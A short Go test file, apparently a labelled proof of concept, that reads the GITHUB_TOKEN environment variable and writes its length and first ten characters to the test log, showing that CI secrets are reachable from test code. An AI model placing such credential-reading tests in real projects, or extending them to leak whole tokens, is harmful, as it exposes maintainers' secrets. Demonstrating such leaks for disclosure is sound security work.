package tests

import (
	"os"
	"testing"
)

func TestLeakGithubToken(t *testing.T) {
	token := os.Getenv("GITHUB_TOKEN")

	if token == "" {
		t.Log("PoC: GITHUB_TOKEN is empty")
		return
	}

	prefix := token
	if len(prefix) > 10 {
		prefix = prefix[:10]
	}

	t.Logf("PoC: GITHUB_TOKEN is present! Length=%d, Prefix=%q...", len(token), prefix)
}
